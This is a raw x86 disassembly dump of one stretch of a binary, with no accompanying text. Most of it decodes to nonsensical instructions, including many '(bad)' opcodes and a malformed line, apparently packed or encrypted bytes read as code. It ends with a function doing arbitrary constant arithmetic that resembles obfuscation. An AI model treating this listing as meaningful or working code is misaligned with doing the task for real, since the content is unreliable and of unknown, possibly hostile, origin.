  4114da:	mov    dh,0xd3
  4114dc:	cmp    BYTE PTR [edi+ebp*1-0x3998fe84],dl
  4114e3:	imul   esp,DWORD PTR [edx+0x46a82f5d],0xffffff84
  4114ea:	xchg   edi,eax
  4114eb:	imul   BYTE PTR [eax+edi*8-0xe]
  4114ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114f0:	push   edi
  4114f1:	stos   BYTE PTR es:[edi],al
  4114f2:	dec    ebp
  4114f3:	xchg   DWORD PTR [edi-0x6e9e8c0a],edx
  4114f9:	jns    0x4114b8
  4114fb:	mov    eax,0xeff187dd
  411500:	xlat   BYTE PTR ds:[ebx]
  411501:	ins    BYTE PTR es:[edi],dx
  411502:	xor    BYTE PTR [edi],dh
  411504:	mov    DWORD PTR [eax+0x30],eax
  411507:	arpl   WORD PTR [ecx],di
  411509:	push   cs
  41150a:	retf   0xce89
  41150d:	lock call 0x2d1b:0x4031e6e3
  411515:	inc    ah
  411517:	sbb    ch,BYTE PTR [ebp+0x28]
  41151a:	add    BYTE PTR [edi-0xf1847bb],dl
  411520:	adc    eax,DWORD PTR [esi+0x26]
  411523:	xlat   BYTE PTR ds:[ebx]
  411524:	imul   ecx,DWORD PTR ds:0xfb6e0a98,0x4966d293
  41152e:	out    dx,eax
  41152f:	jl     0x4114cd
  411531:	dec    BYTE PTR [ebp+0x6a6ce2ca]
  411537:	dec    ecx
  411538:	or     edi,0x8b9b82b9
  41153e:	dec    edx
  41153f:	and    BYTE PTR [esi],cl
  411541:	or     al,0x83
  411543:	dec    esp
  411544:	push   ebx
  411545:	mov    cl,0x53
  411547:	les    edi,FWORD PTR [edi-0x3da13f36]
  41154d:	sbb    ebx,DWORD PTR [eax]
  41154f:	outs   dx,DWORD PTR ds:[esi]
  411550:	aaa    
  411551:	xor    eax,0xd3ca980c
  411556:	add    ebx,DWORD PTR [ebp-0x79acf489]
  41155c:	(bad)  
  41155e:	ds and bh,dh
  411561:	adc    esp,DWORD PTR [edx-0x4287ec28]
  411567:	pusha  
  411568:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411569:	push   es
  41156a:	mov    fs,esi
  41156c:	fs ds scas eax,DWORD PTR es:[edi]
  41156f:	or     BYTE PTR [ecx],bl
  411571:	popa   
  411572:	stc    
  411573:	pushf  
  411574:	cdq    
  411575:	fisubr WORD PTR [edx+0x790397b3]
  41157b:	mov    edi,0xa50be043
  411580:	hlt    
  411581:	xor    eax,0x1f642f7
  411586:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411587:	adc    DWORD PTR [ecx],ebx
  411589:	jp     0x411548
  41158b:	test   BYTE PTR [esi-0x1624b2b0],0x11
  411592:	push   DWORD PTR [ebx+0x63]
  411595:	pushf  
  411596:	dec    edx
  411597:	sbb    eax,0x975ed97e
  41159c:	js     0x4115ca
  41159e:	mov    al,0xd8
  4115a0:	call   DWORD PTR [ebx+0x49]
  4115a3:	jnp    0x4115a4
  4115a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4115a6:	es enter 0x2d24,0x74
  4115ab:	push   ebp
  4115ac:	pop    edx
  4115ad:	jmp    0x41160f
  4115af:	push   eax
  4115b0:	adc    eax,0xb0eb5d2a
  4115b5:	not    BYTE PTR [ebp-0x4e33a8bc]
  4115bb:	jg     0x41157a
  4115bd:	mov    ds:0xaaedbe95,al
  4115c2:	bound  eax,QWORD PTR ds:0xb9374f90
  4115c8:	aam    0x13
  4115ca:	call   0x3bfb5c4d
  4115cf:	add    BYTE PTR [edx-0x55],0xd7
  4115d3:	mov    cl,0x2d
  4115d5:	pop    ss
  4115d6:	sub    esp,DWORD PTR [edi+0x24]
  4115d9:	jge    0x411594
  4115db:	mov    BYTE PTR [edx+0x38],dl
  4115de:	ds or  eax,0x37d846ae
  4115e4:	ds jae 0x411574
  4115e7:	call   0x5b1703c4
  4115ec:	pop    edx
  4115ed:	jmp    0x411589
  4115ef:	fs jbe 0x411625
  4115f2:	fs lahf 
  4115f4:	push   edx
  4115f5:	push   ebx
  4115f6:	mov    ebp,0x20988884
  4115fb:	int3   
  4115fc:	loopne 0x4115d3
  4115fe:	dec    ebp
  4115ff:	inc    ebp
  411600:	xor    edi,DWORD PTR [edi+0x3b]
  411603:	adc    eax,0xe20de03
  411608:	pop    ds
  411609:	jns    0x41163c
  41160b:	icebp  
  41160c:	pop    edi
  41160d:	add    eax,0x1caee47b
  411612:	lods   eax,DWORD PTR ds:[esi]
  411613:	pop    ds
  411614:	inc    ebp
  411615:	xchg   ebx,eax
  411616:	mov    esp,0x1be7be2
  41161b:	mov    dl,0xba
  41161d:	(bad)  
  41161e:	fist   DWORD PTR [ebp+0x2f]
  411621:	or     DWORD PTR [esi+0x24a1437b],0xebaddf82
  41162b:	and    BYTE PTR [ebx+0x33a342e1],cl
  411631:	inc    ecx
  411632:	ds loop 0x411654
  411635:	enter  0x8401,0xa7
  411639:	pusha  
  41163a:	xchg   ebx,eax
  41163b:	aad    0x6f
  41163d:	add    eax,0x640b8d79
  411642:	pushf  
  411643:	inc    esi
  411644:	pusha  
  411645:	add    eax,0x17a06083
  41164a:	jp     0x411664
  41164c:	mov    ah,0x32
  41164e:	push   0xffffffec
  411650:	add    esi,DWORD PTR [esi*2-0x5d4b565e]
  411657:	jo     0x4116c6
  411659:	pop    edx
  41165a:	aam    0xd
  41165c:	aad    0x2b
  41165e:	cwde   
  41165f:	out    0x76,al
  411661:	enter  0xecf0,0x61
  411665:	fwait
  411666:	pop    esp
  411667:	in     eax,0xa8
  411669:	inc    ebp
  41166a:	nop
  41166b:	in     al,dx
  41166c:	xchg   esi,eax
  41166d:	push   es
  41166e:	xchg   DWORD PTR [esi+0x4228b2d2],ecx
  411674:	fwait
  411675:	out    dx,al
  411676:	pop    ebp
  411677:	rcl    DWORD PTR [esi],0x8e
  41167a:	push   ds
  41167b:	mov    al,ds:0x6483ac9e
  411680:	sub    ecx,edi
  411682:	jle    0x411618
  411684:	sub    al,0xe2
  411686:	and    edi,DWORD PTR [esi+0x15]
  411689:	sbb    DWORD PTR [edx+0x5f6f41a2],edi
  41168f:	mov    cl,0x92
  411691:	in     al,dx
  411692:	push   ecx
  411693:	pop    esp
  411694:	scas   al,BYTE PTR es:[edi]
  411695:	out    0x8,al
  411697:	mov    esi,DWORD PTR [ebx-0x2cf5cc88]
  41169d:	retf   
  41169e:	xchg   ebp,eax
  41169f:	adc    DWORD PTR [ebx+0x44],eax
  4116a2:	in     al,dx
  4116a3:	mov    bh,0xe2
  4116a5:	adc    dh,BYTE PTR [edi+0x3b]
  4116a8:	adc    ebx,DWORD PTR [ebx]
  4116aa:	dec    ebp
  4116ab:	xchg   ebp,eax
  4116ac:	inc    esp
  4116ad:	ror    BYTE PTR [ecx-0x220bcdf6],1
  4116b3:	adc    bh,dh
  4116b5:	fidiv  DWORD PTR [edi-0x48ea5abb]
  4116bb:	push   edx
  4116bc:	mov    ah,BYTE PTR [esi]
  4116be:	cmp    al,0x1c
  4116c0:	test   DWORD PTR [edx-0x303904eb],ebx
  4116c6:	adc    al,0xa9
  4116c8:	xlat   BYTE PTR ds:[ebx]
  4116c9:	adc    al,0x2c
  4116cb:	aad    0x4e
  4116cd:	jnp    0x411702
  4116cf:	hlt    
  4116d0:	push   cs
  4116d1:	iret   
  4116d2:	mov    edx,0x5f6cc7e
  4116d7:	(bad)  
  4116d8:	cmp    DWORD PTR [ecx-0x5d],ecx
  4116db:	or     edx,DWORD PTR [ecx+0x41]
  4116de:	adc    ecx,esp
  4116e0:	jmp    0x3d28836c
  4116e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116e6:	sub    al,0x68
  4116e8:	nop
  4116e9:	(bad)  
  4116ea:	mov    ds:0x59f97078,al
  4116ef:	mov    esp,0x93449ad1
  4116f4:	dec    ebx
  4116f5:	adc    DWORD PTR [eax-0x62],esp
  4116f8:	add    DWORD PTR [ebp-0x11],0x5e
  4116fc:	into   
  4116fd:	mov    ebx,0xb06098ec
  411702:	aam    0x7c
  411704:	inc    edx
  411705:	mov    bx,WORD PTR [edi+eiz*2-0x5f750701]
  41170d:	sahf   
  41170e:	adc    BYTE PTR [eax+eiz*1],dh
  411711:	sub    BYTE PTR [edi],bh
  411713:	or     bh,BYTE PTR [esi-0xcc5480d]
  411719:	repz xor DWORD PTR [esp+eax*2-0x38b65733],0xfffffffa
  411722:	and    DWORD PTR ds:0x6e92c730,0xbdeb0456
  41172c:	mov    edi,0x70b9733e
  411731:	imul   edx
  411733:	mov    edi,0x7331cd12
  411738:	add    al,0xc1
  41173a:	shl    BYTE PTR [esi],1
  41173c:	inc    edi
  41173d:	pop    ebx
  41173e:	mov    eax,0xf4768f7f
  411743:	mov    dl,0xa6
  411745:	mov    esi,0xc7b5242f
  41174a:	sbb    ecx,DWORD PTR [eax]
  41174c:	and    al,0x83
  41174e:	cmp    al,0x14
  411750:	mov    ds:0xe250f6d9,eax
  411755:	sbb    DWORD PTR [edx],eax
  411757:	scas   al,BYTE PTR es:[edi]
  411758:	pop    esi
  411759:	mov    edx,0xdf01cf19
  41175e:	add    esi,0xffffffaf
  411761:	cmp    ch,bl
  411763:	pop    eax
  411764:	(bad)  
  411765:	repnz sbb edx,edi
  411768:	push   cs
  411769:	dec    ebp
  41176a:	neg    BYTE PTR [ecx+eax*4]
  41176d:	inc    eax
  41176e:	stos   DWORD PTR es:[edi],eax
  41176f:	mov    esp,0xcee68b2f
  411774:	test   BYTE PTR [esi],bl
  411776:	adc    esi,DWORD PTR [esi+0x26]
  411779:	cmc    
  41177a:	jb     0x4117f6
  41177c:	sub    eax,0xa63da6f1
  411781:	mov    eax,0x36296772
  411786:	rcr    DWORD PTR [esi+0x182f3fe4],0xae
  41178d:	(bad)  
  41178e:	in     eax,0x5
  411790:	pop    eax
  411791:	das    
  411792:	dec    esp
  411793:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411794:	stos   BYTE PTR es:[edi],al
  411795:	aam    0xf3
  411797:	fdivp  st(5),st
  411799:	adc    BYTE PTR [esp+ebp*2],dl
  41179c:	xor    edx,DWORD PTR [ecx-0x73]
  41179f:	sti    
  4117a0:	xchg   dl,bh
  4117a2:	cwde   
  4117a3:	jl     0x411763
  4117a5:	ficomp DWORD PTR [eax-0x2c]
  4117a8:	add    al,0xf4
  4117aa:	sbb    BYTE PTR [eax],bl
  4117ac:	sbb    eax,0xa1cbf719
  4117b1:	mov    dh,0x1f
  4117b3:	fadd   st(3),st
  4117b5:	test   DWORD PTR [edi+0x17330b92],ecx
  4117bb:	mov    ds:0x9bb49c4c,al
  4117c0:	data16 das 
  4117c2:	test   BYTE PTR ss:[esp+esi*2+0x6deb367b],cl
  4117ca:	mov    ah,BYTE PTR [esi-0x72]
  4117cd:	adc    bh,al
  4117cf:	pop    ebp
  4117d0:	popf   
  4117d1:	push   esi
  4117d2:	xchg   ebx,eax
  4117d3:	mov    bl,0xb0
  4117d5:	call   0xe2ce0980
  4117da:	addr16 inc ebp
  4117dc:	lods   al,BYTE PTR ds:[esi]
  4117dd:	mov    dl,0x6c
  4117df:	mov    esp,0x391eb182
  4117e4:	jnp    0x4117c5
  4117e6:	and    ebx,edi
  4117e8:	into   
  4117e9:	pop    eax
  4117ea:	aas    
  4117eb:	pop    esi
  4117ec:	stos   DWORD PTR es:[edi],eax
  4117ed:	aas    
  4117ee:	pop    ecx
  4117ef:	jl     0x4117b5
  4117f1:	push   cs
  4117f2:	retf   
  4117f3:	cmp    al,0x8e
  4117f5:	and    BYTE PTR [esi+0x40],0xc0
  4117f9:	push   esp
  4117fa:	lock iret 
  4117fc:	adc    al,0x24
  4117fe:	adc    ah,dh
  411800:	lods   al,BYTE PTR ds:[esi]
  411801:	pop    ebp
  411802:	(bad)  
  411803:	or     esi,ecx
  411805:	xchg   esp,eax
  411806:	xor    BYTE PTR [edi+0x63314aa9],bl
  41180c:	loopne 0x411851
  41180e:	jno    0x411836
  411810:	aas    
  411811:	push   0xffffffd4
  411813:	sub    bh,bh
  411815:	or     ebp,ebp
  411817:	or     ebp,DWORD PTR [ebx-0x7]
  41181a:	pop    ds
  41181b:	ss pop ebp
  41181d:	rcr    edi,0x40
  411820:	fwait
  411821:	out    dx,al
  411822:	arpl   WORD PTR [ebp+eax*2+0x671c05e8],bx
  411829:	add    eax,0x9af21e55
  41182e:	xchg   ebp,eax
  41182f:	adc    eax,0xab616f0b
  411834:	aam    0x14
  411836:	jb     0x41181a
  411838:	stos   BYTE PTR es:[edi],al
  411839:	mov    dl,0x50
  41183b:	jmp    0x411bca
  411840:	xlat   BYTE PTR ds:[ebx]
  411841:	xchg   ebx,eax
  411842:	push   edx
  411843:	call   FWORD PTR [edx-0x30636400]
  411849:	fist   WORD PTR [eax+0x7ae81490]
  41184f:	xchg   edx,eax
  411850:	scas   eax,DWORD PTR es:[edi]
  411851:	pop    edx
  411852:	mov    esi,0xbec499be
  411857:	mov    esi,0xdab950c0
  41185c:	cmp    eax,0x8db75a3
  411861:	push   0x43
  411863:	aad    0x87
  411865:	cmp    dl,ch
  411867:	sbb    bh,BYTE PTR [edx]
  411869:	mov    al,0x19
  41186b:	pop    esi
  41186c:	loop   0x411882
  41186e:	jnp    0x41189b
  411870:	sti    
  411871:	mov    ch,0x80
  411873:	mov    bl,0xd9
  411875:	mov    ebp,0xac33f1cd
  41187a:	pop    ebx
  41187b:	int3   
  41187c:	in     eax,0xca
  41187e:	ds dec edi
  411880:	pop    eax
  411881:	and    BYTE PTR [ebx+0x281e1288],ch
  411887:	adc    al,0xd7
  411889:	shr    BYTE PTR [eax-0x67],1
  41188c:	enter  0x946c,0x18
  411890:	std    
  411891:	add    bh,dl
  411893:	sahf   
  411894:	loop   0x411904
  411896:	sahf   
  411897:	pop    ecx
  411898:	inc    edi
  411899:	pop    eax
  41189a:	fidiv  DWORD PTR [eax]
  41189c:	dec    eax
  41189d:	in     al,0x10
  41189f:	inc    edx
  4118a0:	ss jns 0x41187a
  4118a3:	fs out 0x9d,al
  4118a6:	jmp    0x411878
  4118a8:	(bad)  
  4118a9:	or     al,0x6c
  4118ab:	cld    
  4118ac:	stos   BYTE PTR es:[edi],al
  4118ad:	cli    
  4118ae:	ret    
  4118af:	and    ebp,ebp
  4118b1:	rol    BYTE PTR [eax],1
  4118b3:	pop    ss
  4118b4:	outs   dx,DWORD PTR ds:[esi]
  4118b5:	mov    edi,0x28b7bf19
  4118ba:	fwait
  4118bb:	sbb    ebx,DWORD PTR [ecx+0x323d60f]
  4118c1:	stos   DWORD PTR es:[edi],eax
  4118c2:	cwde   
  4118c3:	mov    dh,0x5a
  4118c5:	xchg   esi,eax
  4118c6:	sti    
  4118c7:	sbb    edi,ebx
  4118c9:	sbb    DWORD PTR [esi],eax
  4118cb:	popa   
  4118cc:	icebp  
  4118cd:	adc    eax,0x6f52e45d
  4118d2:	jl     0x41191b
  4118d4:	rol    BYTE PTR [esi-0x3b],1
  4118d7:	mov    ebx,DWORD PTR [eax+ebx*1-0x16febaf7]
  4118de:	jae    0x41189e
  4118e0:	cmp    al,0x69
  4118e2:	aaa    
  4118e3:	repz mov dh,BYTE PTR [edi+eiz*2+0x7a]
  4118e8:	inc    ebp
  4118e9:	push   0xf77c4da1
  4118ee:	lahf   
  4118ef:	es jo  0x41191e
  4118f2:	jnp    0x41192b
  4118f4:	in     al,0x45
  4118f6:	ds pop es
  4118f8:	push   ds
  4118f9:	pushf  
  4118fa:	inc    esi
  4118fb:	mov    ds:0xec036ca2,eax
  411900:	push   edx
  411901:	adc    bh,BYTE PTR [ebx]
  411903:	inc    esp
  411904:	aaa    
  411905:	in     eax,0x75
  411907:	mov    bh,0x30
  411909:	fwait
  41190a:	sub    cl,al
  41190c:	mov    dl,BYTE PTR [ecx+ebp*1-0x7f]
  411910:	mov    ?,WORD PTR [eax+0x8240b25]
  411916:	xor    edx,eax
  411918:	stos   BYTE PTR es:[edi],al
  411919:	es inc esp
  41191b:	mov    ecx,0x5554faa7
  411920:	and    eax,0x3ba1fde4
  411925:	dec    ecx
  411926:	cmp    al,0xc9
  411928:	lds    edx,FWORD PTR [edi+0x50f2185e]
  41192e:	(bad)  
  41192f:	repz iret 
  411931:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411932:	adc    BYTE PTR [esi-0x4e],cl
  411935:	leave  
  411936:	pop    ds
  411937:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411938:	jae    0x411908
  41193a:	clc    
  41193b:	lahf   
  41193c:	mov    al,ds:0x9567b83a
  411941:	mov    bl,0x58
  411943:	dec    ebp
  411944:	lahf   
  411945:	inc    edx
  411946:	mov    esi,0x34af700e
  41194b:	cld    
  41194c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41194d:	dec    ebx
  41194e:	mov    bh,0x51
  411950:	icebp  
  411951:	ins    BYTE PTR es:[edi],dx
  411952:	inc    edi
  411953:	sub    esi,DWORD PTR [edx]
  411955:	xlat   BYTE PTR ds:[ebx]
  411956:	daa    
  411957:	dec    ebx
  411958:	mov    esi,0x2cc98c16
  41195d:	(bad)  
  41195e:	stc    
  41195f:	jl     0x4119be
  411961:	in     al,dx
  411962:	push   cs
  411963:	inc    esi
  411964:	es mov ecx,0xbfee4f8
  41196a:	or     BYTE PTR [ecx],al
  41196c:	jge    0x4119a8
  41196e:	int    0xfb
  411970:	dec    edx
  411971:	not    BYTE PTR [esi]
  411973:	or     al,0x2e
  411975:	test   bl,0x9
  411978:	and    al,0xa5
  41197a:	dec    esi
  41197b:	xchg   edx,eax
  41197c:	lahf   
  41197d:	xor    BYTE PTR [edx+0x55],dh
  411980:	idiv   esp
  411982:	aam    0xaa
  411984:	cld    
  411985:	mov    ds:0x2121fd44,eax
  41198a:	mov    BYTE PTR [eax],cl
  41198c:	push   0xdad7d95
  411991:	or     BYTE PTR [ebx],bh
  411993:	sbb    BYTE PTR [edi],ch
  411995:	inc    ebp
  411996:	jbe    0x4119c9
  411998:	adc    bl,BYTE PTR [ecx+0x38068040]
  41199e:	push   es
  41199f:	pavgw  mm2,mm4
  4119a2:	clc    
  4119a3:	push   ss
  4119a4:	(bad)  
  4119a5:	fist   DWORD PTR [ebx]
  4119a7:	fsub   QWORD PTR [ecx+0x1b]
  4119aa:	mov    al,0xee
  4119ac:	(bad)  
  4119ad:	mov    dh,0xad
  4119af:	add    edx,DWORD PTR [ecx+0x40aa781]
  4119b5:	lods   eax,DWORD PTR cs:[esi]
  4119b7:	fwait
  4119b8:	pushf  
  4119b9:	jl     0x411941
  4119bb:	mov    bl,0x21
  4119bd:	rcl    DWORD PTR [esi+ebp*8+0x67],1
  4119c1:	mov    eax,0x77a35df4
  4119c6:	inc    esp
  4119c7:	adc    DWORD PTR [edi+0xd44956f],edi
  4119cd:	jns    0x411974
  4119cf:	les    ecx,FWORD PTR [esi]
  4119d1:	pushf  
  4119d2:	stos   DWORD PTR es:[edi],eax
  4119d3:	and    al,BYTE PTR [ebx+0x16effb55]
  4119d9:	lds    ebp,FWORD PTR [edx-0x4dc33144]
  4119df:	sub    eax,0xb5158b5b
  4119e4:	pop    ds
  4119e5:	(bad)  
  4119e6:	in     eax,0x52
  4119e8:	(bad)  
  4119e9:	sbb    eax,0x15d1325f
  4119ee:	and    bl,BYTE PTR [edi+0x8]
  4119f1:	call   0xc4f74974
  4119f6:	fs or  al,0xd
  4119f9:	fstp   QWORD PTR [ecx]
  4119fb:	sub    al,0x58
  4119fd:	adc    dl,BYTE PTR [ecx+0x5b]
  411a00:	(bad)  
  411a01:	dec    ebx
  411a02:	mov    ebp,0x57a6c822
  411a07:	pop    ecx
  411a08:	fisubr DWORD PTR [edx]
  411a0a:	loop   0x4119cd
  411a0c:	mov    ds:0x5af45370,al
  411a11:	cmp    edx,DWORD PTR [ecx]
  411a13:	lods   eax,DWORD PTR ds:[esi]
  411a14:	sbb    edx,DWORD PTR [ebp-0x7a]
  411a17:	and    dh,ah
  411a19:	repnz adc ah,bh
  411a1c:	and    esi,DWORD PTR [edi+0x35163b]
  411a22:	inc    esi
  411a23:	dec    esi
  411a24:	xchg   ebp,eax
  411a25:	pop    edi
  411a26:	push   edx
  411a27:	(bad)  
  411a28:	fsub   st(3),st
  411a2a:	pusha  
  411a2b:	xchg   BYTE PTR [esi+eiz*4-0x21d93219],dl
  411a32:	sub    BYTE PTR [esi-0x25],bl
  411a35:	and    ah,BYTE PTR [edx]
  411a37:	mov    ds:0x25150a5b,al
  411a3c:	xchg   ebp,eax
  411a3d:	mov    WORD PTR [edi-0xc],cs
  411a40:	or     ebp,edi
  411a42:	neg    BYTE PTR [edx+0x2c]
  411a45:	aas    
  411a46:	ficomp DWORD PTR [ebp+0x18484a4a]
  411a4c:	popa   
  411a4d:	stc    
  411a4e:	gs fwait
  411a50:	(bad)  
  411a51:	repnz and eax,DWORD PTR [ebx]
  411a54:	xchg   ebp,eax
  411a55:	pop    ecx
  411a56:	jo     0x411a93
  411a58:	mov    ebp,esi
  411a5a:	cmc    
  411a5b:	daa    
  411a5c:	ins    DWORD PTR es:[edi],dx
  411a5d:	addr16 ret 0xa197
  411a61:	leave  
  411a62:	xor    eax,0x9c0bf266
  411a67:	nop
  411a68:	shl    DWORD PTR [ecx+0x2],1
  411a6b:	cdq    
  411a6c:	fstp   DWORD PTR [edx]
  411a6e:	je     0x411a87
  411a70:	mov    ch,0x81
  411a72:	pop    edx
  411a73:	jnp    0x411ab3
  411a75:	and    eax,0xea5ff0e0
  411a7a:	(bad)  
  411a7b:	mov    al,ds:0xb8dc63eb
  411a80:	jno    0x411a26
  411a82:	stos   DWORD PTR es:[edi],eax
  411a83:	inc    esp
  411a84:	mov    al,0xd0
  411a86:	push   eax
  411a87:	push   ebx
  411a88:	sub    ebx,DWORD PTR [edi+0x5519db20]
  411a8e:	leave  
  411a8f:	daa    
  411a90:	cmp    eax,0xd5dae7d
  411a95:	xchg   BYTE PTR [edi],dh
  411a97:	sbb    esi,ecx
  411a99:	mov    es,WORD PTR [edx]
  411a9b:	outs   dx,DWORD PTR ds:[esi]
  411a9c:	mov    bl,BYTE PTR [edx+0x6d]
  411a9f:	inc    ebp
  411aa0:	sub    dh,dl
  411aa2:	lods   al,BYTE PTR ds:[esi]
  411aa3:	inc    eax
  411aa4:	pop    ecx
  411aa5:	fild   QWORD PTR [esi+ebx*8+0x67]
  411aa9:	loop   0x411ace
  411aab:	test   esp,edi
  411aad:	or     al,0x38
  411aaf:	cmp    bh,BYTE PTR [ebx+0x55]
  411ab2:	and    eax,0x91a27758
  411ab7:	mov    ds:0xb76f9de0,eax
  411abc:	rcr    BYTE PTR [ebx+ebx*4+0x4206188d],1
  411ac3:	inc    ebp
  411ac4:	sub    ch,BYTE PTR [edx]
  411ac6:	leave  
  411ac7:	adc    eax,0x7380bc7a
  411acc:	sub    eax,0xdaff3713
  411ad1:	gs push ebp
  411ad3:	xchg   ebp,eax
  411ad4:	and    cl,BYTE PTR [edx+0x11]
  411ad7:	inc    esi
  411ad8:	and    BYTE PTR [esi],ch
  411ada:	or     al,bl
  411adc:	mov    al,BYTE PTR [ecx+ebx*2+0x564a82fb]
  411ae3:	push   edx
  411ae4:	in     al,dx
  411ae5:	test   BYTE PTR [edi+0x696161b2],0xdd
  411aec:	pop    esi
  411aed:	push   DWORD PTR [ebx]
  411aef:	jb     0x411b18
  411af1:	stc    
  411af2:	sub    dl,BYTE PTR [ecx+ecx*1+0x4c80e619]
  411af9:	sahf   
  411afa:	cli    
  411afb:	ret    
  411afc:	or     al,0xe4
  411afe:	fld    QWORD PTR [eax]
  411b00:	inc    ch
  411b02:	push   eax
  411b03:	cmp    dh,BYTE PTR [ebx+0x6f]
  411b06:	mov    cs,WORD PTR [edx+0xa]
  411b09:	out    dx,al
  411b0a:	cwde   
  411b0b:	jge    0x411b14
  411b0d:	add    DWORD PTR [esi-0x16],esp
  411b10:	jae    0x411b3b
  411b12:	mov    eax,DWORD PTR [ebx-0xf02b999]
  411b18:	jecxz  0x411a9f
  411b1a:	ins    DWORD PTR es:[edi],dx
  411b1b:	outs   dx,DWORD PTR ds:[esi]
  411b1c:	jae    0x411b92
  411b1e:	mov    eax,0xfadd02e6
  411b23:	hlt    
  411b24:	adc    eax,0xc5d62043
  411b29:	inc    esp
  411b2a:	stos   DWORD PTR es:[edi],eax
  411b2b:	repz xchg edx,eax
  411b2d:	add    DWORD PTR [edi-0x6b],ebx
  411b30:	pop    esp
  411b31:	xor    DWORD PTR [esi+eiz*2-0x5fa6f50e],esp
  411b38:	(bad)  
  411b39:	icebp  
  411b3a:	push   edx
  411b3b:	pop    esp
  411b3c:	mov    bl,0x26
  411b3e:	cdq    
  411b3f:	imul   ebp,DWORD PTR [ecx],0xffffffca
  411b42:	rcl    DWORD PTR [edx],1
  411b44:	pop    ecx
  411b45:	push   ebx
  411b46:	add    esp,DWORD PTR [ecx-0x271853c7]
  411b4c:	imul   ebp,DWORD PTR [ebx],0x62
  411b4f:	scas   al,BYTE PTR es:[edi]
  411b50:	cmp    eax,DWORD PTR [edi+0x14]
  411b53:	xchg   esi,eax
  411b54:	stc    
  411b55:	fadd   st,st(7)
  411b57:	mov    ch,dh
  411b59:	dec    BYTE PTR gs:[edx]
  411b5c:	jp     0x411b68
  411b5e:	inc    eax
  411b5f:	sub    esp,DWORD PTR [ecx+0x7a0e93ab]
  411b65:	gs stc 
  411b67:	(bad)  
  411b68:	js     0x411b6a
  411b6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b6b:	mov    esi,esp
  411b6d:	not    DWORD PTR [esi]
  411b6f:	int    0x3b
  411b71:	inc    esp
  411b72:	loopne 0x411b37
  411b74:	aad    0x3c
  411b76:	or     eax,0x546f2a97
  411b7b:	std    
  411b7c:	or     eax,0xaecaeebb
  411b81:	inc    ecx
  411b82:	add    DWORD PTR [eax-0x6a],ecx
  411b85:	imul   DWORD PTR [edx-0x7]
  411b88:	cmp    ah,BYTE PTR [ebp-0x339a9332]
  411b8e:	movnti DWORD PTR [edi+ebx*1+0x718b9110],esp
  411b96:	outs   dx,DWORD PTR ds:[esi]
  411b97:	loope  0x411b73
  411b99:	jns    0x411bd4
  411b9b:	(bad)
  411b9e:	inc    ebp
  411b9f:	fst    QWORD PTR [ecx-0x469e1ea6]
  411ba5:	cdq    
  411ba6:	mov    ah,0x44
  411ba8:	lock dec eax
  411baa:	pop    ecx
  411bab:	pop    edx
  411bac:	punpckhwd mm5,QWORD PTR [edi+eax*4]
  411bb0:	jno    0x411c30
  411bb2:	outs   dx,DWORD PTR ds:[esi]
  411bb3:	or     edx,DWORD PTR [eax+eax*1-0x55]
  411bb7:	stc    
  411bb8:	test   DWORD PTR [ecx+0x6dda731a],ebx
  411bbe:	arpl   WORD PTR [ecx],si
  411bc0:	cli    
  411bc1:	dec    edi
  411bc2:	ret    
  411bc3:	xor    al,0xf7
  411bc5:	in     eax,dx
  411bc6:	fimul  DWORD PTR [esi+0x448d6a19]
  411bcc:	and    al,0x24
  411bce:	push   eax
  411bcf:	call   0x40f1e1
  411bd4:	mov    eax,DWORD PTR [esp+0x18]
  411bd8:	mov    ecx,DWORD PTR [esp+0x1c]
  411bdc:	push   DWORD PTR [ebp+0x18]
  411bdf:	mov    ebx,DWORD PTR [ebp+0xc]
  411be2:	push   DWORD PTR [ebp+0x14]
  411be5:	mov    esi,DWORD PTR [ebp+0x8]
  411be8:	push   DWORD PTR [ebp+0x10]
  411beb:	push   DWORD PTR [esp+0x20]
  411bef:	push   DWORD PTR [esp+0x20]
  411bf3:	push   DWORD PTR [esp+0x38]
  411bf7:	push   DWORD PTR [esp+0x38]
  411bfb:	call   0x401000
  411c00:	pop    esi
  411c01:	pop    ebx
  411c02:	mov    esp,ebp
  411c04:	pop    ebp
  411c05:	ret    0x14
  411c08:	push   ebp
  411c09:	mov    ebp,esp
  411c0b:	sub    esp,0x30
  411c0e:	mov    DWORD PTR [ebp-0x24],0x7c16
  411c15:	mov    DWORD PTR [ebp-0x20],0x53bd
  411c1c:	mov    DWORD PTR [ebp-0x18],0x3bd5
  411c23:	mov    DWORD PTR [ebp-0x1c],0x6ab6
  411c2a:	mov    DWORD PTR [ebp-0xc],0x4b9d
  411c31:	mov    DWORD PTR [ebp-0x8],0x7e48
  411c38:	mov    DWORD PTR [ebp-0x4],0x604b
  411c3f:	mov    DWORD PTR [ebp-0x30],0x5b69
  411c46:	mov    DWORD PTR [ebp-0x2c],0x4521
  411c4d:	mov    DWORD PTR [ebp-0x28],0x2979
  411c54:	mov    DWORD PTR [ebp-0x14],0x9e8
  411c5b:	mov    DWORD PTR [ebp-0x10],0x40e5
  411c62:	mov    ecx,DWORD PTR [ebp-0x4]
  411c65:	mov    eax,DWORD PTR [ebp-0x8]
  411c68:	add    ecx,0x1d04
  411c6e:	xor    ecx,eax
  411c70:	mov    eax,DWORD PTR [ebp-0xc]
  411c73:	and    ecx,0x6f79
  411c79:	imul   ecx,eax
  411c7c:	xor    ecx,0xe33ab1
  411c82:	push   esi
  411c83:	mov    DWORD PTR [ebp-0x4],0x5989
  411c8a:	mov    DWORD PTR [ebp-0x8],0x402c1
  411c91:	mov    DWORD PTR [ebp-0xc],0x4114
  411c98:	mov    eax,DWORD PTR [ebp-0xc]
  411c9b:	mov    esi,DWORD PTR [ebp-0x8]
  411c9e:	xor    edx,edx
  411ca0:	sub    eax,0x6cb6
  411ca5:	div    esi
  411ca7:	mov    edx,DWORD PTR [ebp-0x4]
  411caa:	mov    esi,DWORD PTR [ebp+0xc]
  411cad:	or     eax,edx
  411caf:	xor    eax,0x67f1
  411cb4:	mov    edx,ecx
  411cb6:	sub    edx,eax
